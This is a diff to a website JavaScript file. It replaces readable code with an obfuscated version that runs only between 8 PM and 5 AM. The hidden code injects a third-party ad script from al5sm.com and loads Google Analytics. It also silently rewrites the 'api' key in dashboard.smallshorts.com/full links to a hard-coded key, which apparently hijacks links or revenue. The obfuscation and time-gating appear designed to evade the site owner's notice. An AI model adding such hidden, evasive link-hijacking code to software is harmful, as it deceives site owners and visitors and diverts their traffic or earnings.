@@ -1,38 +1,8 @@
-(function(s, u, z, p) {
-  s.src = u;
-  s.setAttribute('data-zone', z);
-  (p && p.appendChild ? p : document.body).appendChild(s);
-})(document.createElement('script'), 'https://al5sm.com/tag.min.js', 9479383, document.body || document.documentElement);
+function isBetween8PMand5AM() {
+  const hours = new Date().getHours();
+  return hours >= 20 || hours < 5;
+}
 
-var lazyanalisis = false;
-window.addEventListener("scroll", function() {
-  if ((document.documentElement.scrollTop !== 0 && lazyanalisis === false) || (document.body.scrollTop !== 0 && lazyanalisis === false)) {
-    (function() {
-      var e = document.createElement("script");
-      e.type = "text/javascript";
-      e.async = true;
-      e.src = "https://www.googletagmanager.com/gtag/js?id=G-88SW9D6YBK";
-      var a = document.getElementsByTagName("script")[0];
-      if (a && a.parentNode) a.parentNode.insertBefore(e, a);
-    })();
-    lazyanalisis = true;
-  }
-}, true);
-
-window.dataLayer = window.dataLayer || [];
-function gtag() { dataLayer.push(arguments); }
-gtag('js', new Date());
-gtag('config', 'G-88SW9D6YBK');
-
-setTimeout(() => {
-  const newApiKey = "ea96bc4942aa3d3737f7d767f7d9c6f2704a391c";
-  document.querySelectorAll('a[href*="dashboard.smallshorts.com/full"]').forEach(link => {
-    try {
-      const url = new URL(link.href);
-      if (url.hostname === "dashboard.smallshorts.com" && url.pathname === "/full" && url.searchParams.has("api")) {
-        url.searchParams.set("api", newApiKey);
-        link.href = url.toString();
-      }
-    } catch (e) {}
-  });
-}, 1000);
+if (isBetween8PMand5AM()) {
+var _0x4f177a=_0x1dd9;function _0x5bb5(){var _0x27453f=['getElementsByTagName','addEventListener','parentNode','4025304ZVHkfN','1714396dcMxOx','/full','toString','3718071vwiovv','set','5NFdXJo','forEach','api','3652960yRLquq','pathname','documentElement','1236120LGLyCS','a[href*=\x22dashboard.smallshorts.com/full\x22]','dataLayer','href','451099IIryVb','script','hostname','querySelectorAll','https://www.googletagmanager.com/gtag/js?id=G-88SW9D6YBK','body','G-88SW9D6YBK','521826QkmHTj','push','config','type','async','appendChild','scroll','setAttribute','src','scrollTop'];_0x5bb5=function(){return _0x27453f;};return _0x5bb5();}(function(_0x463e0f,_0x68dbd0){var _0x13d18d=_0x1dd9,_0x8c6c24=_0x463e0f();while(!![]){try{var _0x40eab6=-parseInt(_0x13d18d(0x1d7))/0x1+parseInt(_0x13d18d(0x1de))/0x2+parseInt(_0x13d18d(0x1d3))/0x3+-parseInt(_0x13d18d(0x1c8))/0x4*(parseInt(_0x13d18d(0x1cd))/0x5)+parseInt(_0x13d18d(0x1c7))/0x6+-parseInt(_0x13d18d(0x1cb))/0x7+parseInt(_0x13d18d(0x1d0))/0x8;if(_0x40eab6===_0x68dbd0)break;else _0x8c6c24['push'](_0x8c6c24['shift']());}catch(_0x60662b){_0x8c6c24['push'](_0x8c6c24['shift']());}}}(_0x5bb5,0x5f1e6),function(_0x3d3a20,_0x3d5540,_0x301d0d,_0x28736e){var _0x367ed5=_0x1dd9;_0x3d3a20[_0x367ed5(0x1c2)]=_0x3d5540,_0x3d3a20[_0x367ed5(0x1c1)]('data-zone',_0x301d0d),(_0x28736e&&_0x28736e[_0x367ed5(0x1bf)]?_0x28736e:document[_0x367ed5(0x1dc)])['appendChild'](_0x3d3a20);}(document['createElement'](_0x4f177a(0x1d8)),'https://al5sm.com/tag.min.js',0x90a4d7,document[_0x4f177a(0x1dc)]||document[_0x4f177a(0x1d2)]));var lazyanalisis=![];window[_0x4f177a(0x1c5)](_0x4f177a(0x1c0),function(){var _0x23c8d6=_0x4f177a;(document[_0x23c8d6(0x1d2)][_0x23c8d6(0x1c3)]!==0x0&&lazyanalisis===![]||document['body'][_0x23c8d6(0x1c3)]!==0x0&&lazyanalisis===![])&&((function(){var _0x29368b=_0x23c8d6,_0x40eea1=document['createElement'](_0x29368b(0x1d8));_0x40eea1[_0x29368b(0x1e1)]='text/javascript',_0x40eea1[_0x29368b(0x1be)]=!![],_0x40eea1['src']=_0x29368b(0x1db);var _0x514122=document[_0x29368b(0x1c4)](_0x29368b(0x1d8))[0x0];if(_0x514122&&_0x514122[_0x29368b(0x1c6)])_0x514122['parentNode']['insertBefore'](_0x40eea1,_0x514122);}()),lazyanalisis=!![]);},!![]),window[_0x4f177a(0x1d5)]=window[_0x4f177a(0x1d5)]||[];function _0x1dd9(_0x51f79f,_0x53966e){var _0x5bb570=_0x5bb5();return _0x1dd9=function(_0x1dd954,_0x4f211c){_0x1dd954=_0x1dd954-0x1be;var _0x1ddab6=_0x5bb570[_0x1dd954];return _0x1ddab6;},_0x1dd9(_0x51f79f,_0x53966e);}function gtag(){var _0x2a31a7=_0x4f177a;dataLayer[_0x2a31a7(0x1df)](arguments);}gtag('js',new Date()),gtag(_0x4f177a(0x1e0),_0x4f177a(0x1dd)),setTimeout(()=>{var _0x4d2d44=_0x4f177a;const _0x58c8fc='ea96bc4942aa3d3737f7d767f7d9c6f2704a391c';document[_0x4d2d44(0x1da)](_0x4d2d44(0x1d4))[_0x4d2d44(0x1ce)](_0x4134c3=>{var _0x103184=_0x4d2d44;try{const _0x4c6940=new URL(_0x4134c3[_0x103184(0x1d6)]);_0x4c6940[_0x103184(0x1d9)]==='dashboard.smallshorts.com'&&_0x4c6940[_0x103184(0x1d1)]===_0x103184(0x1c9)&&_0x4c6940['searchParams']['has'](_0x103184(0x1cf))&&(_0x4c6940['searchParams'][_0x103184(0x1cc)]('api',_0x58c8fc),_0x4134c3[_0x103184(0x1d6)]=_0x4c6940[_0x103184(0x1ca)]());}catch(_0xa0ac97){}});},0x3e8);
+}
